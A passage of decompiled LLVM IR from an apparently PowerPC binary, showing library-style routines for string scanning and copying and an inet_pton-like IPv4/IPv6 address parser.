  %v3_1000bfd4 = load i8, i8* %v2_1000bfd4, align 1
  %v4_1000bfd4 = zext i8 %v3_1000bfd4 to i32
  %v4_1000bfd8 = icmp eq i32 %v4_1000bfd4, %v0_1000bf78
  br i1 %v4_1000bfd8, label %dec_label_pc_1000bfe0, label %dec_label_pc_1000bfe8

dec_label_pc_1000bfe0:                            ; preds = %dec_label_pc_1000bfd4
  ret i32 %v1_1000bfac

dec_label_pc_1000bfe8:                            ; preds = %dec_label_pc_1000bfd4
  %v2_1000bfe8 = inttoptr i32 %v1_1000bfc0 to i8*
  %v3_1000bfe8 = load i8, i8* %v2_1000bfe8, align 1
  %v4_1000bfe8 = zext i8 %v3_1000bfe8 to i32
  %v4_1000bfec = icmp eq i32 %v4_1000bfe8, %v0_1000bf78
  br i1 %v4_1000bfec, label %dec_label_pc_1000bff4, label %dec_label_pc_1000bffc

dec_label_pc_1000bff4:                            ; preds = %dec_label_pc_1000bfe8
  ret i32 %v1_1000bfc0

dec_label_pc_1000bffc:                            ; preds = %dec_label_pc_1000bfe8
  %v2_1000bffc = inttoptr i32 %v1_1000bfbc to i8*
  %v3_1000bffc = load i8, i8* %v2_1000bffc, align 1
  %v4_1000bffc = zext i8 %v3_1000bffc to i32
  %v4_1000c000 = icmp eq i32 %v4_1000bffc, %v0_1000bf78
  br i1 %v4_1000c000, label %dec_label_pc_1000c008, label %dec_label_pc_1000bf90

dec_label_pc_1000c008:                            ; preds = %dec_label_pc_1000bffc
  ret i32 %v1_1000bfbc

; uselistorder directives
  uselistorder i32 %v1_1000bf94, { 1, 0 }
  uselistorder i32 %v0_1000bfcc, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000bf80, { 1, 0 }
  uselistorder i32 %v0_1000bf78, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000bf6c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000bf701, { 2, 1, 0 }
  uselistorder i32 %v1_1000bf58, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000bf60, { 1, 0 }
}

define i32 @function_1000c010(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c010:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c014

dec_label_pc_1000c014:                            ; preds = %dec_label_pc_1000c014, %dec_label_pc_1000c010
  %v0_1000c014 = phi i32 [ %v1_1000c018, %dec_label_pc_1000c014 ], [ %tmp, %dec_label_pc_1000c010 ]
  %v1_1000c014 = inttoptr i32 %v0_1000c014 to i8*
  %v2_1000c014 = load i8, i8* %v1_1000c014, align 1
  %v1_1000c018 = add i32 %v0_1000c014, 1
  store i32 %v1_1000c018, i32* %r11.global-to-local, align 4
  %v3_1000c01c = icmp eq i8 %v2_1000c014, 0
  store i1 %v3_1000c01c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c01c, label %dec_label_pc_1000c024, label %dec_label_pc_1000c014

dec_label_pc_1000c024:                            ; preds = %dec_label_pc_1000c014
  %v3_1000c024 = icmp eq i32 %arg2, 3
  store i1 %v3_1000c024, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c028 = add i32 %v0_1000c014, -1
  store i32 %v1_1000c028, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1000c0c4, label %dec_label_pc_1000c034

dec_label_pc_1000c034:                            ; preds = %dec_label_pc_1000c024
  %v1_1000c034 = udiv i32 %arg2, 4
  store i32 %v1_1000c034, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c03c

dec_label_pc_1000c03c:                            ; preds = %dec_label_pc_1000c03c.dec_label_pc_1000c03c_crit_edge, %dec_label_pc_1000c034
  %v2_1000c04c = phi i32 [ %v0_1000c040.pre, %dec_label_pc_1000c03c.dec_label_pc_1000c03c_crit_edge ], [ %v1_1000c028, %dec_label_pc_1000c034 ]
  %v0_1000c03c = load i32, i32* @r4, align 4
  %v1_1000c03c = inttoptr i32 %v0_1000c03c to i8*
  %v2_1000c03c = load i8, i8* %v1_1000c03c, align 1
  %v1_1000c040 = add i32 %v2_1000c04c, 1
  store i32 %v1_1000c040, i32* %r7.global-to-local, align 4
  %v1_1000c044 = add i32 %v0_1000c03c, 1
  store i32 %v1_1000c044, i32* %r6.global-to-local, align 4
  %v3_1000c048 = icmp eq i8 %v2_1000c03c, 0
  store i1 %v3_1000c048, i1* %cr7_eq.global-to-local, align 1
  %v4_1000c04c = inttoptr i32 %v1_1000c040 to i8*
  store i8 %v2_1000c03c, i8* %v4_1000c04c, align 1
  %v0_1000c050 = load i32, i32* @lr, align 4
  %v1_1000c050 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c050, i32 %v0_1000c050)
  %v0_1000c054 = load i32, i32* @r4, align 4
  %v1_1000c054 = add i32 %v0_1000c054, 1
  %v2_1000c054 = inttoptr i32 %v1_1000c054 to i8*
  %v3_1000c054 = load i8, i8* %v2_1000c054, align 1
  %v0_1000c058 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c058 = add i32 %v0_1000c058, 1
  store i32 %v1_1000c058, i32* %r8.global-to-local, align 4
  %v0_1000c05c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c05c = add i32 %v0_1000c05c, 1
  store i32 %v1_1000c05c, i32* %r10.global-to-local, align 4
  %v1_1000c060 = add i32 %v0_1000c058, 2
  store i32 %v1_1000c060, i32* %r9.global-to-local, align 4
  %v1_1000c064 = add i32 %v0_1000c05c, 2
  store i32 %v1_1000c064, i32* %r12.global-to-local, align 4
  %v1_1000c068 = add i32 %v0_1000c058, 3
  store i32 %v1_1000c068, i32* @r4, align 4
  %v3_1000c06c = icmp eq i8 %v3_1000c054, 0
  store i1 %v3_1000c06c, i1* %cr7_eq.global-to-local, align 1
  %v4_1000c070 = inttoptr i32 %v1_1000c05c to i8*
  store i8 %v3_1000c054, i8* %v4_1000c070, align 1
  %v0_1000c074 = load i32, i32* @lr, align 4
  %v1_1000c074 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c074, i32 %v0_1000c074)
  %v0_1000c078 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c078 = add i32 %v0_1000c078, 1
  %v2_1000c078 = inttoptr i32 %v1_1000c078 to i8*
  %v3_1000c078 = load i8, i8* %v2_1000c078, align 1
  %v0_1000c07c = load i32, i32* %r12.global-to-local, align 4
  %v1_1000c07c = add i32 %v0_1000c07c, 1
  store i32 %v1_1000c07c, i32* %r11.global-to-local, align 4
  %v3_1000c080 = icmp eq i8 %v3_1000c078, 0
  store i1 %v3_1000c080, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c084 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000c084 = add i32 %v2_1000c084, 1
  %v4_1000c084 = inttoptr i32 %v3_1000c084 to i8*
  store i8 %v3_1000c078, i8* %v4_1000c084, align 1
  %v0_1000c088 = load i32, i32* @lr, align 4
  %v1_1000c088 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c088, i32 %v0_1000c088)
  %v0_1000c08c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c08c = add i32 %v0_1000c08c, 1
  %v2_1000c08c = inttoptr i32 %v1_1000c08c to i8*
  %v3_1000c08c = load i8, i8* %v2_1000c08c, align 1
  %v4_1000c08c = zext i8 %v3_1000c08c to i32
  store i32 %v4_1000c08c, i32* %r9.global-to-local, align 4
  %v3_1000c090 = icmp eq i8 %v3_1000c08c, 0
  store i1 %v3_1000c090, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c094 = load i32, i32* %r12.global-to-local, align 4
  %v3_1000c094 = add i32 %v2_1000c094, 1
  %v4_1000c094 = inttoptr i32 %v3_1000c094 to i8*
  store i8 %v3_1000c08c, i8* %v4_1000c094, align 1
  %v0_1000c098 = load i32, i32* @lr, align 4
  %v1_1000c098 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c098, i32 %v0_1000c098)
  %v0_1000c09c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c09c = add i32 %v0_1000c09c, -1
  store i32 %v1_1000c09c, i32* %ctr.global-to-local, align 4
  %v2_1000c09c = icmp eq i32 %v1_1000c09c, 0
  br i1 %v2_1000c09c, label %dec_label_pc_1000c0a0, label %dec_label_pc_1000c03c.dec_label_pc_1000c03c_crit_edge

dec_label_pc_1000c03c.dec_label_pc_1000c03c_crit_edge: ; preds = %dec_label_pc_1000c03c
  %v0_1000c040.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c03c

dec_label_pc_1000c0a0:                            ; preds = %dec_label_pc_1000c03c
  %v0_1000c0a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c0a0 = urem i32 %v0_1000c0a0, 4
  store i32 %v1_1000c0a0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c0c4

dec_label_pc_1000c0a8:                            ; preds = %dec_label_pc_1000c0c4, %dec_label_pc_1000c0a8.dec_label_pc_1000c0a8_crit_edge
  %v0_1000c0ac = phi i32 [ %v0_1000c0ac.pre, %dec_label_pc_1000c0a8.dec_label_pc_1000c0a8_crit_edge ], [ %v0_1000c0c4, %dec_label_pc_1000c0c4 ]
  %v0_1000c0a8 = load i32, i32* @r4, align 4
  %v1_1000c0a8 = inttoptr i32 %v0_1000c0a8 to i8*
  %v2_1000c0a8 = load i8, i8* %v1_1000c0a8, align 1
  %v3_1000c0a8 = zext i8 %v2_1000c0a8 to i32
  store i32 %v3_1000c0a8, i32* %r9.global-to-local, align 4
  %v1_1000c0ac = add i32 %v0_1000c0ac, -1
  store i32 %v1_1000c0ac, i32* %r5.global-to-local, align 4
  %v1_1000c0b0 = add i32 %v0_1000c0a8, 1
  store i32 %v1_1000c0b0, i32* @r4, align 4
  %v3_1000c0b4 = icmp eq i8 %v2_1000c0a8, 0
  store i1 %v3_1000c0b4, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c0b8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000c0b8 = add i32 %v2_1000c0b8, 1
  %v4_1000c0b8 = inttoptr i32 %v3_1000c0b8 to i8*
  store i8 %v2_1000c0a8, i8* %v4_1000c0b8, align 1
  store i32 %v3_1000c0b8, i32* %r11.global-to-local, align 4
  %v0_1000c0bc = load i32, i32* @lr, align 4
  %v1_1000c0bc = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c0bc, i32 %v0_1000c0bc)
  %v0_1000c0cc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c0cc = add i32 %v0_1000c0cc, -1
  store i32 %v1_1000c0cc, i32* %ctr.global-to-local, align 4
  %v2_1000c0cc = icmp eq i32 %v1_1000c0cc, 0
  br i1 %v2_1000c0cc, label %dec_label_pc_1000c0d0, label %dec_label_pc_1000c0a8.dec_label_pc_1000c0a8_crit_edge

dec_label_pc_1000c0a8.dec_label_pc_1000c0a8_crit_edge: ; preds = %dec_label_pc_1000c0a8
  %v0_1000c0ac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c0a8

dec_label_pc_1000c0c4:                            ; preds = %dec_label_pc_1000c024, %dec_label_pc_1000c0a0
  %v0_1000c0c4 = phi i32 [ %arg2, %dec_label_pc_1000c024 ], [ %v1_1000c0a0, %dec_label_pc_1000c0a0 ]
  store i32 %v0_1000c0c4, i32* %ctr.global-to-local, align 4
  %v2_1000c0cc3 = icmp eq i32 %v0_1000c0c4, 0
  br i1 %v2_1000c0cc3, label %dec_label_pc_1000c0d0, label %dec_label_pc_1000c0a8

dec_label_pc_1000c0d0:                            ; preds = %dec_label_pc_1000c0a8, %dec_label_pc_1000c0c4
  %v0_1000c0d0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c0d0 = icmp eq i32 %v0_1000c0d0, 0
  store i1 %v3_1000c0d0, i1* %cr7_eq.global-to-local, align 1
  %v0_1000c0d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000c0d0, i32 %v0_1000c0d4)
  %v0_1000c0d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c0d8 = trunc i32 %v0_1000c0d8 to i8
  %v2_1000c0d8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000c0d8 = add i32 %v2_1000c0d8, 1
  %v4_1000c0d8 = inttoptr i32 %v3_1000c0d8 to i8*
  store i8 %v1_1000c0d8, i8* %v4_1000c0d8, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1000c0c4, { 1, 2, 0 }
  uselistorder i32 %v1_1000c0cc, { 1, 0 }
  uselistorder i32 %v1_1000c0a0, { 1, 0 }
  uselistorder i32 %v1_1000c09c, { 1, 0 }
  uselistorder i32 %v1_1000c018, { 1, 0 }
  uselistorder i32 %v0_1000c014, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000c0d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0c4, { 1, 0 }
}

define i32 @function_1000c0e0(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000c0e0:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000c1101 = load i32, i32* @r3, align 4
  %v1_1000c1102 = inttoptr i32 %v0_1000c1101 to i8*
  %v2_1000c1103 = load i8, i8* %v1_1000c1102, align 1
  %v3_1000c1146 = icmp eq i8 %v2_1000c1103, 0
  br i1 %v3_1000c1146, label %dec_label_pc_1000c124, label %dec_label_pc_1000c11c

dec_label_pc_1000c0ec:                            ; preds = %dec_label_pc_1000c0ec, %dec_label_pc_1000c11c
  %v0_1000c0ec = phi i32 [ %v1_1000c0f0, %dec_label_pc_1000c0ec ], [ %tmp, %dec_label_pc_1000c11c ]
  %v1_1000c0ec = inttoptr i32 %v0_1000c0ec to i8*
  %v2_1000c0ec = load i8, i8* %v1_1000c0ec, align 1
  %v1_1000c0f0 = add i32 %v0_1000c0ec, 1
  %v3_1000c0f4 = icmp eq i8 %v2_1000c0ec, 0
  %v4_1000c0f8 = icmp eq i8 %v0_1000c0f88.in, %v2_1000c0ec
  %brmerge = or i1 %v3_1000c0f4, %v4_1000c0f8
  br i1 %brmerge, label %dec_label_pc_1000c100, label %dec_label_pc_1000c0ec

dec_label_pc_1000c100:                            ; preds = %dec_label_pc_1000c0ec
  br i1 %v3_1000c0f4, label %dec_label_pc_1000c124, label %dec_label_pc_1000c108

dec_label_pc_1000c108:                            ; preds = %dec_label_pc_1000c100
  %v1_1000c108 = add i32 %v0_1000c108, 1
  %v1_1000c10c = add i32 %v0_1000c10c, 1
  %v1_1000c110 = inttoptr i32 %v1_1000c10c to i8*
  %v2_1000c110 = load i8, i8* %v1_1000c110, align 1
  %v3_1000c114 = icmp eq i8 %v2_1000c110, 0
  br i1 %v3_1000c114, label %dec_label_pc_1000c124, label %dec_label_pc_1000c11c

dec_label_pc_1000c11c:                            ; preds = %dec_label_pc_1000c0e0, %dec_label_pc_1000c108
  %v0_1000c10c = phi i32 [ %v1_1000c10c, %dec_label_pc_1000c108 ], [ %v0_1000c1101, %dec_label_pc_1000c0e0 ]
  %v0_1000c108 = phi i32 [ %v1_1000c108, %dec_label_pc_1000c108 ], [ 0, %dec_label_pc_1000c0e0 ]
  %v0_1000c0f88.in = phi i8 [ %v2_1000c110, %dec_label_pc_1000c108 ], [ %v2_1000c1103, %dec_label_pc_1000c0e0 ]
  br label %dec_label_pc_1000c0ec

dec_label_pc_1000c124:                            ; preds = %dec_label_pc_1000c108, %dec_label_pc_1000c100, %dec_label_pc_1000c0e0
  %v0_1000c124 = phi i32 [ 0, %dec_label_pc_1000c0e0 ], [ %v1_1000c108, %dec_label_pc_1000c108 ], [ %v0_1000c108, %dec_label_pc_1000c100 ]
  ret i32 %v0_1000c124

; uselistorder directives
  uselistorder i32 %v0_1000c0ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000c11c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0ec, { 1, 0 }
}

define i32 @function_1000c12c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c12c:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c134 = call i32 @__asm_mfcr()
  store i32 %v0_1000c134, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1000c148 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c148, i32* %r7.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000c1ac

dec_label_pc_1000c15c:                            ; preds = %dec_label_pc_1000c1ac
  %v1_1000c1c0 = add i32 %v0_1000c1bc, -48
  %v2_1000c1c4 = icmp ugt i32 %v1_1000c1c0, 9
  br i1 %v2_1000c1c4, label %dec_label_pc_1000c198, label %dec_label_pc_1000c164

dec_label_pc_1000c164:                            ; preds = %dec_label_pc_1000c15c
  %v0_1000c164 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c164 = inttoptr i32 %v0_1000c164 to i8*
  %v2_1000c164 = load i8, i8* %v1_1000c164, align 1
  %v3_1000c164 = zext i8 %v2_1000c164 to i32
  %v1_1000c168 = mul nuw nsw i32 %v3_1000c164, 10
  %v2_1000c16c = add i32 %v1_1000c168, %v0_1000c1bc
  %v1_1000c170 = add i32 %v2_1000c16c, -48
  %v2_1000c174 = icmp ugt i32 %v1_1000c170, 255
  br i1 %v2_1000c174, label %dec_label_pc_1000c1f4, label %dec_label_pc_1000c17c

dec_label_pc_1000c17c:                            ; preds = %dec_label_pc_1000c164
  %v1_1000c17c = trunc i32 %v1_1000c170 to i8
  store i8 %v1_1000c17c, i8* %v1_1000c164, align 1
  %v0_1000c180 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000c180, label %dec_label_pc_1000c184, label %dec_label_pc_1000c1ac.backedge

dec_label_pc_1000c184:                            ; preds = %dec_label_pc_1000c17c
  %v0_1000c184 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c184 = add i32 %v0_1000c184, 1
  store i32 %v1_1000c184, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_1000c18c = icmp sgt i32 %v1_1000c184, 4
  br i1 %v2_1000c18c, label %dec_label_pc_1000c1f4, label %dec_label_pc_1000c1ac.backedge

dec_label_pc_1000c198:                            ; preds = %dec_label_pc_1000c15c
  %v3_1000c15c = icmp eq i32 %v0_1000c1d0, 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_1000c1c8.not = icmp ne i32 %v0_1000c1bc, 46
  %v0_1000c1a0 = load i1, i1* %cr0_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000c15c, %v0_1000c1a0
  %or.cond = or i1 %brmerge, %v3_1000c1c8.not
  br i1 %or.cond, label %dec_label_pc_1000c1f4, label %dec_label_pc_1000c1a8

dec_label_pc_1000c1a8:                            ; preds = %dec_label_pc_1000c198
  %v0_1000c1a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c1a8 = trunc i32 %v0_1000c1a8 to i8
  %v2_1000c1a8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000c1a8 = add i32 %v2_1000c1a8, 1
  %v4_1000c1a8 = inttoptr i32 %v3_1000c1a8 to i8*
  store i8 %v1_1000c1a8, i8* %v4_1000c1a8, align 1
  store i32 %v3_1000c1a8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000c1ac.backedge

dec_label_pc_1000c1ac.backedge:                   ; preds = %dec_label_pc_1000c1a8, %dec_label_pc_1000c17c, %dec_label_pc_1000c184
  %v0_1000c1ac.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000c1b0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000c1ac

dec_label_pc_1000c1ac:                            ; preds = %dec_label_pc_1000c1ac.backedge, %dec_label_pc_1000c12c
  %v0_1000c1b0 = phi i32 [ %v0_1000c1b0.pre, %dec_label_pc_1000c1ac.backedge ], [ 0, %dec_label_pc_1000c12c ]
  %v0_1000c1b4 = phi i32 [ %v0_1000c1ac.pre, %dec_label_pc_1000c1ac.backedge ], [ %v0_1000c134, %dec_label_pc_1000c12c ]
  %v1_1000c1ac = inttoptr i32 %v0_1000c1b4 to i8*
  %v2_1000c1ac = load i8, i8* %v1_1000c1ac, align 1
  %v3_1000c1ac = zext i8 %v2_1000c1ac to i32
  store i32 %v3_1000c1ac, i32* %r11.global-to-local, align 4
  %v1_1000c1b0 = icmp slt i32 %v0_1000c1b0, 0
  %v2_1000c1b0 = icmp sgt i32 %v0_1000c1b0, 0
  %v3_1000c1b0 = icmp eq i32 %v0_1000c1b0, 0
  store i1 %v3_1000c1b0, i1* %cr0_eq.global-to-local, align 1
  %v1_1000c1b4 = add i32 %v0_1000c1b4, 1
  store i32 %v1_1000c1b4, i32* %r3.global-to-local, align 4
  %v4_1000c1b8 = call i4 @__asm_mcrf_cr0_read(i1 %v1_1000c1b0, i1 %v2_1000c1b0, i1 %v3_1000c1b0, i1 false)
  %v0_1000c1bc = load i32, i32* %r11.global-to-local, align 4
  %v3_1000c1bc = icmp eq i32 %v0_1000c1bc, 0
  %v0_1000c1d0 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_1000c1bc, label %dec_label_pc_1000c1d0, label %dec_label_pc_1000c15c

dec_label_pc_1000c1d0:                            ; preds = %dec_label_pc_1000c1ac
  %tmp9 = icmp slt i32 %v0_1000c1d0, 4
  br i1 %tmp9, label %dec_label_pc_1000c1f4, label %dec_label_pc_1000c1d8

dec_label_pc_1000c1d8:                            ; preds = %dec_label_pc_1000c1d0
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1000c148, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c1e8.339 to i32), i32* @lr, align 4
  %v0_1000c1e4 = call i32 @function_10007104()
  br label %dec_label_pc_1000c1f4

dec_label_pc_1000c1f4:                            ; preds = %dec_label_pc_1000c198, %dec_label_pc_1000c164, %dec_label_pc_1000c184, %dec_label_pc_1000c1d0, %dec_label_pc_1000c1d8
  %storemerge = phi i32 [ 1, %dec_label_pc_1000c1d8 ], [ 0, %dec_label_pc_1000c1d0 ], [ 0, %dec_label_pc_1000c184 ], [ 0, %dec_label_pc_1000c164 ], [ 0, %dec_label_pc_1000c198 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_1000c204 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000c134)
  %v4_1000c204 = extractvalue %0 %v1_1000c204, 2
  store i1 %v4_1000c204, i1* %cr0_eq.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1000c1bc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1000c1b0, { 2, 1, 0 }
  uselistorder i32 %v0_1000c134, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 6, 7, 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000c1f4, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c1ac.backedge, { 0, 2, 1 }
}

define i32 @function_1000c20c(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c20c:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000c210 = load i32, i32* @lr, align 4
  store i32 %v0_1000c210, i32* %r0.global-to-local, align 4
  %v3_1000c214 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_1000c214, label %dec_label_pc_1000c238, label %dec_label_pc_1000c22c

dec_label_pc_1000c22c:                            ; preds = %dec_label_pc_1000c20c
  %v3_1000c22c = icmp eq i32 %arg1, 10
  br i1 %v3_1000c22c, label %dec_label_pc_1000c24c, label %dec_label_pc_1000c3e8

dec_label_pc_1000c238:                            ; preds = %dec_label_pc_1000c20c
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268485188, i32* @lr, align 4
  %v3_1000c240 = call i32 @function_1000c12c(i32 %tmp, i32 %arg3)
  store i32 %v3_1000c240, i32* %r3.global-to-local, align 4
  store i32 %v3_1000c240, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c400

dec_label_pc_1000c24c:                            ; preds = %dec_label_pc_1000c22c
  %v2_1000c24c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000c24c, i32* %r3.global-to-local, align 4
  store i32 268485212, i32* @lr, align 4
  %v3_1000c258 = call i32 @function_100071a0(i32 %v2_1000c24c, i32 0, i32 16)
  store i32 %v3_1000c258, i32* %r3.global-to-local, align 4
  %v0_1000c25c = load i32, i32* @r29, align 4
  %v1_1000c25c = inttoptr i32 %v0_1000c25c to i8*
  %v2_1000c25c = load i8, i8* %v1_1000c25c, align 1
  %v3_1000c25c = zext i8 %v2_1000c25c to i32
  store i32 %v3_1000c25c, i32* %r0.global-to-local, align 4
  store i32 %v3_1000c258, i32* @r31, align 4
  %v2_1000c264 = add i32 %v3_1000c258, 16
  store i32 %v2_1000c264, i32* @r27, align 4
  %v3_1000c268 = icmp eq i8 %v2_1000c25c, 58
  br i1 %v3_1000c268, label %dec_label_pc_1000c270, label %dec_label_pc_1000c27c

dec_label_pc_1000c270:                            ; preds = %dec_label_pc_1000c24c
  %v1_1000c270 = add i32 %v0_1000c25c, 1
  %v2_1000c270 = inttoptr i32 %v1_1000c270 to i8*
  %v3_1000c270 = load i8, i8* %v2_1000c270, align 1
  %v4_1000c270 = zext i8 %v3_1000c270 to i32
  store i32 %v4_1000c270, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c270, i32* @r29, align 4
  %v3_1000c274 = icmp eq i8 %v3_1000c270, 58
  br i1 %v3_1000c274, label %dec_label_pc_1000c27c, label %dec_label_pc_1000c3fc

dec_label_pc_1000c27c:                            ; preds = %dec_label_pc_1000c270, %dec_label_pc_1000c24c
  %v0_1000c27c = phi i32 [ %v1_1000c270, %dec_label_pc_1000c270 ], [ %v0_1000c25c, %dec_label_pc_1000c24c ]
  store i32 %v0_1000c27c, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000c3503036 = inttoptr i32 %v0_1000c27c to i8*
  %v2_1000c3503137 = load i8, i8* %v1_1000c3503036, align 1
  %v3_1000c3503238 = zext i8 %v2_1000c3503137 to i32
  store i32 %v3_1000c3503238, i32* %r3.global-to-local, align 4
  store i32 268485464, i32* @lr, align 4
  %v1_1000c3543339 = call i32 @function_1000cffc(i32 %v3_1000c3503238)
  store i32 %v1_1000c3543339, i32* %r3.global-to-local, align 4
  store i32 %v1_1000c3543339, i32* @r30, align 4
  %v3_1000c3583440 = icmp eq i32 %v1_1000c3543339, 0
  br i1 %v3_1000c3583440, label %dec_label_pc_1000c360, label %dec_label_pc_1000c288.lr.ph

dec_label_pc_1000c288:                            ; preds = %dec_label_pc_1000c288.lr.ph, %dec_label_pc_1000c350.backedge
  %v1_1000c35435 = phi i32 [ %v1_1000c3543341, %dec_label_pc_1000c288.lr.ph ], [ %v1_1000c354, %dec_label_pc_1000c350.backedge ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000f908.340 to i32), i32* @r25, align 4
  %v0_1000c294 = load i32, i32* @r29, align 4
  %v1_1000c294 = add i32 %v0_1000c294, 1
  store i32 %v1_1000c294, i32* @r29, align 4
